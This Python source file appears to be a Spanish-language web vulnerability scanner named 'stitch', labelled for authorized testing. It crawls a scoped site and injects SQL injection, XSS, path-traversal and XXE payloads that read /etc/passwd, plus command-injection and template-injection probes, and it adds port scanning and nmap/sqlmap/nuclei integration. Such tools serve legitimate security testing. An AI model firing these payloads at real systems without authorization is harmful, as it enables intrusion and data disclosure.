#!/usr/bin/env python3
# ============================================================
#  stitch.py - web analysis framework
#  By zstchy
#  python 3.11+ | deps: requests, beautifulsoup4
# ============================================================
import argparse
import hashlib
import json
import os
import re
import socket
import ssl
import sys
import time
import urllib.parse as up
from dataclasses import dataclass, field, asdict
from pathlib import Path

import requests

try:
    from bs4 import BeautifulSoup
    _HAS_BS4 = True
except ImportError:
    _HAS_BS4 = False

__version__ = "0.2.0"

# ============================================================
#  COLORS + BANNER
# ============================================================
RED    = "\33[91m"
PURPLE = "\033[0;35m"
GREEN  = "\033[32m"
YELLOW = "\033[93m"
CYAN   = "\033[36m"
RESET  = "\033[0m"
BOLD   = "\033[1m"

_BANNER_LINES = [
    (RED,    "   ███████╗████████╗██╗████████╗ ██████╗██╗  ██╗"),
    (PURPLE, "   ██╔════╝╚══██╔══╝██║╚══██╔══╝██╔════╝██║  ██║"),
    (RED,    "   ███████╗   ██║   ██║   ██║   ██║     ███████║"),
    (PURPLE, "   ╚════██║   ██║   ██║   ██║   ██║     ██╔══██║"),
    (RED,    "   ███████║   ██║   ██║   ██║   ╚██████╗██║  ██║"),
    (PURPLE, "   ╚══════╝   ╚═╝   ╚═╝   ╚═╝    ╚═════╝╚═╝  ╚═╝"),
]


def clear():
    os.system("cls" if os.name == "nt" else "clear")


def banner_text():
    return "\n".join(f"{c}{line}{RESET}" for c, line in _BANNER_LINES)


def boot_sequence():
    clear()
    lines = [
        (PURPLE, "[BOOT] initializing core..."),
        (PURPLE, "[BOOT] loading modules"),
        (PURPLE, "[BOOT] arming payloads"),
        (PURPLE, "[BOOT] scope guard online"),
        (RED,    "[OK]   all systems nominal"),
    ]
    for color, line in lines:
        sys.stdout.write(color)
        for ch in line:
            sys.stdout.write(ch)
            sys.stdout.flush()
            time.sleep(0.010)
        sys.stdout.write(RESET)
        print()
        time.sleep(0.15)
    time.sleep(0.35)


def draw_banner():
    clear()
    for color, line in _BANNER_LINES:
        sys.stdout.write(color + line + RESET + "\n")
        sys.stdout.flush()
        time.sleep(0.08)


def pulse(times=2):
    for _ in range(times):
        for c in (RED, PURPLE):
            clear()
            print(banner_text())
            print(f"\n{BOLD}{c}        s t i t c h {RESET}")
            time.sleep(0.25)


def boot_banner():
    boot_sequence()
    draw_banner()
    time.sleep(0.4)
    pulse(times=2)
    clear()
    print(banner_text())
    print(f"\n{BOLD}{RED}        s t i t c h {RESET}\n")


# ============================================================
#  INTRO ANIMATION (tkinter) - opcional, se salta si STITCH_NO_INTRO
# ============================================================
def run_intro():
    if os.environ.get("STITCH_NO_INTRO"):
        return
    try:
        _play_intro()
    except Exception:
        # la intro es estética; nunca bloquea el escaneo
        pass


def _play_intro():
    # ============================================================
    #  PEGA AQUÍ EL CUERPO COMPLETO DE TU ANIMACIÓN TKINTER
    #  desde "import math as m" hasta "root.mainloop()"
    #  (el bloque que ya tenías en el archivo monolítico anterior)
    # ============================================================
    pass


# ============================================================
#  SESSION + CONFIG
# ============================================================
UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/124.0 Safari/537.36")
TIMEOUT = 15.0

_DEFAULT_CFG = {
    "last_url": None,
    "last_scope": None,
    "last_report": "out.json",
    "last_workers": 1,
}


def build_session():
    s = requests.Session()
    s.headers.update({"User-Agent": UA})
    s.verify = True
    return s


def config_path() -> Path:
    override = os.environ.get("STITCH_CONFIG")
    if override:
        return Path(override)
    if os.name == "nt":
        base = Path(os.environ.get("APPDATA", Path.home()))
    else:
        base = Path(os.environ.get("XDG_CONFIG_HOME", Path.home() / ".config"))
    return base / "stitch" / "config.json"


def load_config() -> dict:
    p = config_path()
    if not p.exists():
        return dict(_DEFAULT_CFG)
    try:
        with p.open("r", encoding="utf-8") as fh:
            data = json.load(fh)
        merged = dict(_DEFAULT_CFG)
        merged.update(data)
        return merged
    except (OSError, json.JSONDecodeError):
        return dict(_DEFAULT_CFG)


def save_config(data: dict) -> None:
    p = config_path()
    p.parent.mkdir(parents=True, exist_ok=True)
    try:
        with p.open("w", encoding="utf-8") as fh:
            json.dump(data, fh, indent=2)
    except OSError:
        pass


# ============================================================
#  CRAWLER
# ============================================================
@dataclass
class Surface:
    urls: set = field(default_factory=set)
    forms: list = field(default_factory=list)
    params: dict = field(default_factory=dict)


class Crawler:
    def __init__(self, base, scope, session):
        self.base = base
        self.scope = scope
        self.s = session
        self.surface = Surface()
        self.seen = set()

    def in_scope(self, url):
        host = up.urlparse(url).hostname or ""
        return host == self.scope or host.endswith("." + self.scope)

    def crawl(self, max_pages=200, depth=3):
        queue = [(self.base, 0)]
        while queue and len(self.seen) < max_pages:
            url, d = queue.pop(0)
            if url in self.seen or not self.in_scope(url):
                continue
            self.seen.add(url)
            try:
                r = self.s.get(url, timeout=TIMEOUT)
            except requests.RequestException:
                continue
            if "text/html" not in r.headers.get("content-type", ""):
                continue
            self.surface.urls.add(url)
            q = up.parse_qs(up.urlparse(url).query)
            if q:
                self.surface.params[url] = list(q.keys())
            if _HAS_BS4:
                parser = "lxml" if "lxml" in sys.modules else "html.parser"
                soup = BeautifulSoup(r.text, parser)
                for f in soup.find_all("form"):
                    action = up.urljoin(url, f.get("action") or url)
                    method = (f.get("method") or "GET").upper()
                    inputs = [(i.get("name"), i.get("type") or "text")
                              for i in f.find_all(["input", "textarea", "select"])
                              if i.get("name")]
                    self.surface.forms.append((action, method, inputs))
                if d < depth:
                    for a in soup.find_all("a", href=True):
                        nxt = up.urljoin(url, a["href"])
                        if self.in_scope(nxt) and nxt not in self.seen:
                            queue.append((nxt, d + 1))
        return self.surface


# ============================================================
#  ENGINE
# ============================================================
@dataclass
class Finding:
    url: str
    param: str
    kind: str
    evidence: str
    severity: str
    confidence: str
    payload: str = ""


class Engine:
    def __init__(self, session, scope):
        self.s = session
        self.scope = scope
        self.findings = []

    def _mark(self, **kw):
        self.findings.append(Finding(**kw))

    def inject_param(self, url, param, payload):
        p = up.urlparse(url)
        q = up.parse_qs(p.query)
        q[param] = [payload]
        return up.urlunparse(p._replace(query=up.urlencode(q, doseq=True)))

    def sqli(self, url, param):
        err = re.compile(
            r"(SQL syntax|mysql_fetch|ORA-\d{4,5}|PostgreSQL.*ERROR|"
            r"SQLite/JDBCDriver|Unclosed quotation mark)", re.I)
        p1 = self.inject_param(url, param, "'")
        try:
            r1 = self.s.get(p1, timeout=TIMEOUT)
        except requests.RequestException:
            return
        m = err.search(r1.text)
        if m:
            self._mark(url=url, param=param, kind="sqli", evidence=m.group(0),
                       severity="high", confidence="confirmed", payload="'")
            return
        try:
            base = self.s.get(url, timeout=TIMEOUT)
            t = self.inject_param(url, param, "1' AND '1'='1")
            f = self.inject_param(url, param, "1' AND '1'='2")
            rt = self.s.get(t, timeout=TIMEOUT)
            rf = self.s.get(f, timeout=TIMEOUT)
        except requests.RequestException:
            return
        if len(rt.text) != len(rf.text) and abs(len(rt.text) - len(base.text)) < 50:
            self._mark(url=url, param=param, kind="sqli",
                       evidence=f"len(true)={len(rt.text)} len(false)={len(rf.text)}",
                       severity="high", confidence="probable", payload="boolean")

    def xss(self, url, param):
        marker = "hw" + hashlib.md5(str(time.time()).encode()).hexdigest()[:6]
        payload = f"<svg/onload=alert('{marker}')>"
        u = self.inject_param(url, param, payload)
        try:
            r = self.s.get(u, timeout=TIMEOUT)
        except requests.RequestException:
            return
        if payload in r.text or (marker in r.text and "<svg" in r.text.lower()):
            self._mark(url=url, param=param, kind="xss",
                       evidence="reflected unescaped",
                       severity="medium", confidence="confirmed", payload=payload)

    def open_redirect(self, url, param):
        canary = "https://example.org/hw-canary"
        u = self.inject_param(url, param, canary)
        try:
            r = self.s.get(u, timeout=TIMEOUT, allow_redirects=False)
        except requests.RequestException:
            return
        loc = r.headers.get("location", "")
        if canary in loc:
            self._mark(url=url, param=param, kind="open_redirect",
                       evidence=f"Location: {loc}",
                       severity="low", confidence="confirmed", payload=canary)

    def lfi(self, url, param):
        payload = "../../../../etc/passwd"
        u = self.inject_param(url, param, payload)
        try:
            r = self.s.get(u, timeout=TIMEOUT)
        except requests.RequestException:
            return
        if "root:x:0:0" in r.text:
            self._mark(url=url, param=param, kind="lfi",
                       evidence="/etc/passwd disclosed",
                       severity="high", confidence="confirmed", payload=payload)

    def ssrf(self, url, param, canary):
        if not canary:
            return
        u = self.inject_param(url, param, canary)
        try:
            self.s.get(u, timeout=TIMEOUT)
        except requests.RequestException:
            return
        self._mark(url=url, param=param, kind="ssrf",
                   evidence=f"request issued to {canary} (verify responder log)",
                   severity="high", confidence="probable", payload=canary)

    def cmdi(self, url, param):
        payload = ";sleep 5"
        u = self.inject_param(url, param, payload)
        try:
            t0 = time.time()
            self.s.get(u, timeout=15)
            d = time.time() - t0
        except requests.RequestException:
            return
        if d >= 5.0:
            self._mark(url=url, param=param, kind="cmdi",
                       evidence=f"delay {d:.1f}s on sleep payload",
                       severity="critical", confidence="probable", payload=payload)

    def ssti(self, url, param):
        probes = [("{{7*7}}", "49"), ("${7*7}", "49"),
                  ("<%= 7*7 %>", "49"), ("#{7*7}", "49")]
        for payload, expected in probes:
            u = self.inject_param(url, param, payload)
            try:
                r = self.s.get(u, timeout=TIMEOUT)
            except requests.RequestException:
                continue
            if expected in r.text and payload not in r.text:
                self._mark(url=url, param=param, kind="ssti",
                           evidence=f"evaluated {payload} -> {expected}",
                           severity="high", confidence="probable", payload=payload)
                return

    def xxe(self, url, param):
        payload = ('<?xml version="1.0"?>'
                   '<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]>'
                   '<x>&e;</x>')
        try:
            r = self.s.post(url, data=payload,
                            headers={"Content-Type": "application/xml"},
                            timeout=TIMEOUT)
        except requests.RequestException:
            return
        if "root:x:0:0" in r.text:
            self._mark(url=url, param=param, kind="xxe",
                       evidence="/etc/passwd via XXE",
                       severity="high", confidence="confirmed",
                       payload="<!ENTITY e SYSTEM ...>")

    def run(self, surface, ssrf_canary=None):
        for url, params in surface.params.items():
            for p in params:
                self.sqli(url, p)
                self.xss(url, p)
                self.open_redirect(url, p)
                self.lfi(url, p)
                self.cmdi(url, p)
                self.ssti(url, p)
                if ssrf_canary:
                    self.ssrf(url, p, ssrf_canary)

        for action, method, inputs in surface.forms:
            data = {n: "1" for n, _ in inputs}
            for p in data:
                for payload, kind in (("'", "sqli"),
                                      ("<svg/onload=alert(1)>", "xss"),
                                      ("{{7*7}}", "ssti")):
                    d2 = dict(data)
                    d2[p] = payload
                    try:
                        r = self.s.post(action, data=d2, timeout=TIMEOUT)
                    except requests.RequestException:
                        continue
                    if kind == "sqli" and re.search(
                            r"SQL syntax|mysql_fetch|ORA-\d{4,5}", r.text, re.I):
                        self._mark(url=action, param=p, kind="sqli",
                                   evidence="error-based (POST)",
                                   severity="high", confidence="confirmed",
                                   payload=payload)
                    if kind == "xss" and payload in r.text:
                        self._mark(url=action, param=p, kind="xss",
                                   evidence="reflected (POST)",
                                   severity="medium", confidence="confirmed",
                                   payload=payload)
                    if kind == "ssti" and "49" in r.text and payload not in r.text:
                        self._mark(url=action, param=p, kind="ssti",
                                   evidence="POST {{7*7}} -> 49",
                                   severity="high", confidence="probable",
                                   payload=payload)
                if method == "POST":
                    self.xxe(action, p)

        return self.findings


# ============================================================
#  RECON
# ============================================================
SEC_HEADERS = [
    ("Strict-Transport-Security", "HSTS: forces HTTPS, prevents downgrade."),
    ("Content-Security-Policy",   "CSP: restricts script/style origins, mitigates XSS."),
    ("X-Frame-Options",           "Anti-clickjacking."),
    ("X-Content-Type-Options",    "Prevents MIME sniffing (must be 'nosniff')."),
    ("Referrer-Policy",           "Controls Referer header leakage."),
    ("Permissions-Policy",        "Restricts browser APIs (geoloc, camera, mic)."),
]

TECH_SIGNS = {
    "wordpress": [r"wp-content", r"wp-includes", r"/wp-json"],
    "drupal":    [r"Drupal", r"sites/default/files"],
    "joomla":    [r"/components/com_", r"Joomla"],
    "laravel":   [r"laravel_session", r"XSRF-TOKEN"],
    "django":    [r"csrftoken", r"__admin__"],
    "flask":     [r"Werkzeug", r"session=[a-z0-9]+\.[a-z0-9]+"],
    "express":   [r"X-Powered-By.*Express", r"connect.sid"],
    "nginx":     [r"Server: nginx", r"nginx"],
    "apache":    [r"Server: Apache", r"Apache/"],
    "cloudflare":[r"Server: cloudflare", r"cf-ray"],
    "react":     [r"_reactRootContainer", r"data-reactroot"],
    "vue":       [r"__VUE__", r"vue\.js"],
    "angular":   [r"ng-version", r"angular\.min\.js"],
    "jquery":    [r"jquery[.-][0-9]"],
}

COMMON_PORTS = [
    (21, "ftp"), (22, "ssh"), (23, "telnet"), (25, "smtp"), (53, "dns"),
    (80, "http"), (110, "pop3"), (143, "imap"), (443, "https"), (445, "smb"),
    (3306, "mysql"), (3389, "rdp"), (5432, "postgresql"), (6379, "redis"),
    (8080, "http-alt"), (8443, "https-alt"), (27017, "mongodb"),
]


def check_headers(url, session):
    try:
        r = session.get(url, timeout=TIMEOUT)
    except requests.RequestException:
        return {}
    h = {k.lower(): v for k, v in r.headers.items()}
    return {
        "present": {name: (name.lower() in h) for name, _ in SEC_HEADERS},
        "informative": {k: h[k] for k in
                        ("server", "x-powered-by", "via", "x-aspnet-version")
                        if k in h},
    }


def detect_tech(url, session):
    try:
        r = session.get(url, timeout=TIMEOUT)
    except requests.RequestException:
        return []
    blob = r.text + "\n" + "\n".join(f"{k}: {v}" for k, v in r.headers.items())
    found = set()
    for name, pats in TECH_SIGNS.items():
        for pat in pats:
            if re.search(pat, blob, re.I):
                found.add(name)
                break
    return sorted(found)


def scan_ports(host, timeout=1.0):
    open_ports = []
    for port, service in COMMON_PORTS:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        try:
            if sock.connect_ex((host, port)) == 0:
                open_ports.append((port, service))
        except (socket.error, socket.timeout):
            pass
        finally:
            sock.close()
    return open_ports


def check_tls(host, port=443):
    try:
        ctx = ssl.create_default_context()
        with socket.create_connection((host, port), timeout=5) as sock:
            with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                cert = ssock.getpeercert()
        subj = dict(x[0] for x in cert.get("subject", ()))
        issuer = dict(x[0] for x in cert.get("issuer", ()))
        days_left = None
        if cert.get("notAfter"):
            exp = time.strptime(cert["notAfter"], "%b %d %H:%M:%S %Y %Z")
            days_left = (time.mktime(exp) - time.time()) / 86400
        return {"subject": subj.get("commonName"),
                "issuer": issuer.get("organizationName"),
                "expires": cert.get("notAfter"),
                "days_left": days_left}
    except (socket.error, ssl.SSLError, ValueError) as e:
        return {"error": str(e)}


# ============================================================
#  OPTIONAL INTEGRATIONS (nmap, sqlmap, nuclei)
# ============================================================
def _which(binary):
    import shutil
    return shutil.which(binary)


def run_nmap(host):
    nmap = _which("nmap")
    if not nmap:
        return "nmap not found on PATH; install nmap or use built-in port scan (menu 7)."
    try:
        out = subprocess_run([nmap, "-sV", "-T4", "--top-ports", "100", host], 300)
        return out
    except Exception as e:
        return f"nmap failed: {e}"


def run_sqlmap(url):
    sqlmap = _which("sqlmap")
    if not sqlmap:
        return "sqlmap not found on PATH; install sqlmap to confirm SQLi."
    try:
        out = subprocess_run(
            [sqlmap, "-u", url, "--batch", "--level", "1", "--risk", "1"], 600)
        return out
    except Exception as e:
        return f"sqlmap failed: {e}"


def run_nuclei(url):
    nuclei = _which("nuclei")
    if not nuclei:
        return "nuclei not found on PATH; install nuclei to run templates."
    try:
        out = subprocess_run([nuclei, "-u", url, "-silent"], 600)
        return out
    except Exception as e:
        return f"nuclei failed: {e}"


def subprocess_run(cmd, timeout):
    import subprocess
    try:
        out = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return out.stdout or out.stderr
    except subprocess.TimeoutExpired:
        return f"timed out after {timeout}s"
    except OSError as e:
        return f"failed: {e}"


# ============================================================
#  REPORT
# ============================================================
_ORDER = {"critical": 0, "high": 1, "medium": 2, "low": 3}


def write_report(findings, out):
    fs = sorted(findings, key=lambda f: _ORDER.get(f.severity, 9))
    doc = {
        "generated": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "count": len(fs),
        "findings": [asdict(f) for f in fs],
    }
    if out:
        with open(out, "w", encoding="utf-8") as fh:
            json.dump(doc, fh, indent=2)
        print(f"[+] report -> {out} ({len(fs)} findings)")
    else:
        print(json.dumps(doc, indent=2))


# ============================================================
#  MENU INTERACTIVO
# ============================================================
def _ask(prompt, default=None):
    suffix = f" [{default}]" if default is not None else ""
    while True:
        raw = input(f"{PURPLE}{prompt}{RESET}{suffix}: ").strip()
        if raw == "" and default is not None:
            return default
        if raw != "":
            return raw


def _ask_int(prompt, lo, hi, default=None):
    while True:
        raw = _ask(prompt, default)
        try:
            v = int(raw)
        except ValueError:
            print(f"{RED}  ! enter a number between {lo} and {hi}{RESET}")
            continue
        if lo <= v <= hi:
            return v
        print(f"{RED}  ! out of range: {lo}-{hi}{RESET}")


def _ask_yesno(prompt, default="n"):
    while True:
        raw = _ask(f"{prompt} (s/n)", default).lower()
        if raw in ("s", "si", "sí", "y", "yes"):
            return True
        if raw in ("n", "no"):
            return False
        print(f"{RED}  ! responde s o n{RESET}")


def _show_menu():
    clear()
    print(banner_text())
    print(f"\n{BOLD}{RED}        s t i t c h {RESET}")
    print(f"""
{PURPLE}  ┌──────────────────────────────────────────────────────┐
  │  {RED}ESCANER WEB{RESET}{PURPLE}                                          │
  │  {RED}1{RESET}{PURPLE}  Analisis rapido (findings a pantalla)             │
  │  {RED}2{RESET}{PURPLE}  Analisis completo (+ reporte JSON)               │
  │  {RED}3{RESET}{PURPLE}  Analisis con SSRF (requiere responder externo)    │
  │  {RED}4{RESET}{PURPLE}  Solo crawling (mapear URLs y formularios)         │
  │                                                      │
  │  {RED}RECONOCIMIENTO{RESET}{PURPLE}                                       │
  │  {RED}5{RESET}{PURPLE}  Cabeceras de seguridad                         │
  │  {RED}6{RESET}{PURPLE}  Detectar tecnologia                            │
  │  {RED}7{RESET}{PURPLE}  Escaneo de puertos comunes                      │
  │  {RED}8{RESET}{PURPLE}  Certificado TLS                                │
  │  {RED}9{RESET}{PURPLE}  Reconocimiento completo (5+6+7+8)                │
  │                                                      │
  │  {RED}INTEGRACIONES{RESET}{PURPLE}                                       │
  │  {RED}12{RESET}{PURPLE} nmap - servicio y version                       │
  │  {RED}13{RESET}{PURPLE} sqlmap - confirmar SQLi                         │
  │  {RED}14{RESET}{PURPLE} nuclei - templates de la comunidad              │
  │                                                      │
  │  {RED}HERRAMIENTAS{RESET}{PURPLE}                                        │
  │  {RED}10{RESET}{PURPLE} Autenticacion (cookie/header)                   │
  │  {RED}11{RESET}{PURPLE} Modo avanzado (flags)                           │
  │  {RED}0 {RESET}{PURPLE} Salir                                             │
  └──────────────────────────────────────────────────────┘{RESET}
""")


def interactive_main():
    s = build_session()
    cfg = load_config()
    last_url = cfg.get("last_url")
    last_scope = cfg.get("last_scope")
    last_report = cfg.get("last_report") or "out.json"

    while True:
        _show_menu()
        opt = _ask_int("  elige una opcion", 0, 14)

        if opt == 0:
            print(f"{PURPLE}  hasta luego.{RESET}")
            return

        if opt == 11:
            print(f"\n{PURPLE}  modo avanzado: usa flags.{RESET}")
            print("  ejemplo: python stitch.py -u https://target.tld --scope target.tld --report out.json")
            input(f"\n{PURPLE}  Enter para volver al menu...{RESET}")
            continue

        if opt == 7:
            host = _ask("  host o IP a escanear", last_scope)
            if not host:
                continue
            print(f"\n{PURPLE}── puertos abiertos en {host} ──{RESET}")
            ports = scan_ports(host)
            if ports:
                for p, svc in ports:
                    print(f"{GREEN}  [+] {p}/tcp {svc}{RESET}")
            else:
                print(f"{YELLOW}  [?] ningun puerto comun abierto{RESET}")
            input(f"\n{PURPLE}  Enter para volver al menu...{RESET}")
            continue

        url = _ask("  URL (https://...)", last_url)
        if not url or not url.startswith(("http://", "https://")):
            print(f"{RED}  ! la URL debe empezar por http:// o https://{RESET}")
            input(f"{PURPLE}  Enter para continuar...{RESET}")
            continue
        last_url = url
        default_scope = up.urlparse(url).hostname or ""
        last_scope = default_scope

        if opt == 5:
            print(f"\n{PURPLE}── cabeceras de seguridad ──{RESET}")
            res = check_headers(url, s)
            for name, _why in SEC_HEADERS:
                ok = res.get("present", {}).get(name, False)
                mark = f"{GREEN}[+]{RESET}" if ok else f"{RED}[-]{RESET}"
                print(f"  {mark} {name}")
            for k, v in res.get("informative", {}).items():
                print(f"{YELLOW}  [!] {k}: {v}{RESET}")
            input(f"\n{PURPLE}  Enter para volver al menu...{RESET}")
            continue

        if opt == 6:
            print(f"\n{PURPLE}── tecnologia detectada ──{RESET}")
            techs = detect_tech(url, s)
            if techs:
                for t in techs:
                    print(f"{GREEN}  [+] {t}{RESET}")
            else:
                print(f"{YELLOW}  [?] no se reconocio tecnologia{RESET}")
            input(f"\n{PURPLE}  Enter para volver al menu...{RESET}")
            continue

        if opt == 8:
            port = 443 if url.startswith("https") else 80
            print(f"\n{PURPLE}── certificado TLS de {default_scope}:{port} ──{RESET}")
            info = check_tls(default_scope, port)
            if "error" in info:
                print(f"{RED}  ! {info['error']}{RESET}")
            else:
                print(f"  sujeto:  {info.get('subject')}")
                print(f"  emisor:  {info.get('issuer')}")
                print(f"  valido hasta: {info.get('expires')}")
                days = info.get("days_left")
                if days is not None:
                    color = GREEN if days > 30 else YELLOW if days > 7 else RED
                    print(f"{color}  expira en {days:.0f} dias{RESET}")
            input(f"\n{PURPLE}  Enter para volver al menu...{RESET}")
            continue

        if opt == 9:
            print(f"\n{PURPLE}── cabeceras de seguridad ──{RESET}")
            res = check_headers(url, s)
            for name, _why in SEC_HEADERS:
                ok = res.get("present", {}).get(name, False)
                mark = f"{GREEN}[+]{RESET}" if ok else f"{RED}[-]{RESET}"
                print(f"  {mark} {name}")
            print(f"\n{PURPLE}── tecnologia detectada ──{RESET}")
            techs = detect_tech(url, s)
            if techs:
                for t in techs:
                    print(f"{GREEN}  [+] {t}{RESET}")
            else:
                print(f"{YELLOW}  [?] no se reconocio tecnologia{RESET}")
            print(f"\n{PURPLE}── puertos abiertos en {default_scope} ──{RESET}")
            ports = scan_ports(default_scope)
            if ports:
                for p, svc in ports:
                    print(f"{GREEN}  [+] {p}/tcp {svc}{RESET}")
            else:
                print(f"{YELLOW}  [?] ningun puerto comun abierto{RESET}")
            port = 443 if url.startswith("https") else 80
            print(f"\n{PURPLE}── certificado TLS de {default_scope}:{port} ──{RESET}")
            info = check_tls(default_scope, port)
            if "error" in info:
                print(f"{RED}  ! {info['error']}{RESET}")
            else:
                print(f"  sujeto:  {info.get('subject')}")
                print(f"  emisor:  {info.get('issuer')}")
                print(f"  valido hasta: {info.get('expires')}")
            input(f"\n{PURPLE}  Enter para volver al menu...{RESET}")
            continue

        if opt == 10:
            print(f"\n{PURPLE}  autenticacion: pega valores para las requests{RESET}")
            cookie = _ask("  cookie (nombre=valor, vacio para ninguna)", "")
            header_name = _ask("  header extra (nombre, vacio para ninguno)", "")
            header_val = ""
            if header_name:
                header_val = _ask(f"  valor para {header_name}", "")
            if cookie and "=" in cookie:
                k, v = cookie.split("=", 1)
                s.cookies.set(k, v)
                print(f"{GREEN}  [+] cookie guardada{RESET}")
            if header_name and header_val:
                s.headers[header_name] = header_val
                print(f"{GREEN}  [+] header {header_name} guardado{RESET}")
            input(f"{PURPLE}  Enter para volver al menu...{RESET}")
            continue

        if opt == 12:
            print(f"\n{PURPLE}── nmap ──{RESET}")
            print(run_nmap(default_scope))
            input(f"\n{PURPLE}  Enter para volver al menu...{RESET}")
            continue

        if opt == 13:
            target = _ask("  URL con parametro (?id=1)", url)
            print(f"\n{PURPLE}── sqlmap ──{RESET}")
            print(run_sqlmap(target))
            input(f"\n{PURPLE}  Enter para volver al menu...{RESET}")
            continue

        if opt == 14:
            print(f"\n{PURPLE}── nuclei ──{RESET}")
            print(run_nuclei(url))
            input(f"\n{PURPLE}  Enter para volver al menu...{RESET}")
            continue

        # opciones 1-4 (escaneo)
        scope = _ask("  scope (dominio permitido)", default_scope)
        report_path = None
        ssrf_canary = None
        do_crawl_only = (opt == 4)

        if opt in (2, 3):
            report_path = _ask("  archivo de reporte", last_report)
            last_report = report_path
        if opt == 3:
            ssrf_canary = _ask("  URL del responder SSRF (https://...)")

        max_pages = _ask_int("  max paginas a crawlear", 1, 5000, "200")

        print(f"\n{PURPLE}  ── resumen ──{RESET}")
        print(f"  url:        {url}")
        print(f"  scope:      {scope}")
        print(f"  max pages:  {max_pages}")
        if report_path:
            print(f"  reporte:    {report_path}")
        if ssrf_canary:
            print(f"  ssrf:       {ssrf_canary}")
        if do_crawl_only:
            print(f"  modo:       solo crawling")
        if not _ask_yesno("  empezar", "s"):
            continue

        save_config({
            "last_url": last_url,
            "last_scope": last_scope,
            "last_report": last_report,
            "last_workers": 1,
        })

        print(f"\n{PURPLE}[*] crawl {url} scope={scope}{RESET}")
        surf = Crawler(url, scope, s).crawl(max_pages=max_pages)
        print(f"{PURPLE}[*] {len(surf.urls)} urls, {len(surf.forms)} forms, "
              f"{len(surf.params)} param'd urls{RESET}")

        if do_crawl_only:
            print(f"\n{PURPLE}── urls ──{RESET}")
            for u in sorted(surf.urls):
                print(f"  {u}")
            print(f"\n{PURPLE}── formularios ──{RESET}")
            for action, method, inputs in surf.forms:
                names = ", ".join(n for n, _ in inputs) or "(sin campos)"
                print(f"  [{method}] {action}  →  {names}")
            input(f"\n{PURPLE}  Enter para volver al menu...{RESET}")
            continue

        eng = Engine(s, scope)
        findings = eng.run(surf, ssrf_canary=ssrf_canary)
        write_report(findings, report_path)
        input(f"\n{PURPLE}  Enter para volver al menu...{RESET}")


# ============================================================
#  CLI
# ============================================================
def _do_recon_cli(url, scope, s):
    print("── headers ──")
    res = check_headers(url, s)
    for name, _ in SEC_HEADERS:
        ok = res.get("present", {}).get(name, False)
        print(f"  {'[+]' if ok else '[-]'} {name}")
    print("\n── technology ──")
    for t in detect_tech(url, s):
        print(f"  [+] {t}")
    print(f"\n── ports ({scope}) ──")
    for p, svc in scan_ports(scope):
        print(f"  [+] {p}/tcp {svc}")
    print(f"\n── tls ({scope}) ──")
    print(check_tls(scope, 443))


def main():
    if len(sys.argv) == 1 or sys.argv[1] in ("-i", "--interactive"):
        run_intro()
        boot_banner()
        interactive_main()
        return

    ap = argparse.ArgumentParser(prog="stitch",
                                 description="Web analysis framework for authorized testing")
    ap.add_argument("--version", action="version", version=f"stitch {__version__}")
    ap.add_argument("-u", "--url", help="start URL")
    ap.add_argument("--scope", help="allowed host suffix")
    ap.add_argument("--report", default=None, help="JSON report output")
    ap.add_argument("--ssrf-canary", default=None, help="external responder URL")
    ap.add_argument("--max-pages", type=int, default=200)
    ap.add_argument("--timeout", type=float, default=TIMEOUT)
    ap.add_argument("--workers", type=int, default=1)
    ap.add_argument("--recon", action="store_true", help="recon only")
    ap.add_argument("--nmap", action="store_true", help="run nmap on host")
    ap.add_argument("--confirm-sqli", action="store_true", help="run sqlmap")
    ap.add_argument("--nuclei", action="store_true", help="run nuclei")
    a = ap.parse_args()

    if not a.url or not a.scope:
        ap.error("-u/--url and --scope are required unless running interactively")

    run_intro()
    boot_banner()

    s = build_session()

    if a.nmap:
        print(run_nmap(a.scope))
        return
    if a.confirm_sqli:
        print(run_sqlmap(a.url))
        return
    if a.nuclei:
        print(run_nuclei(a.url))
        return
    if a.recon:
        _do_recon_cli(a.url, a.scope, s)
        return

    print(f"[*] crawl {a.url} scope={a.scope}")
    surf = Crawler(a.url, a.scope, s).crawl(max_pages=a.max_pages)
    print(f"[*] {len(surf.urls)} urls, {len(surf.forms)} forms, "
          f"{len(surf.params)} param'd urls")

    eng = Engine(s, a.scope)
    findings = eng.run(surf, ssrf_canary=a.ssrf_canary)
    write_report(findings, a.report)


if __name__ == "__main__":
    main()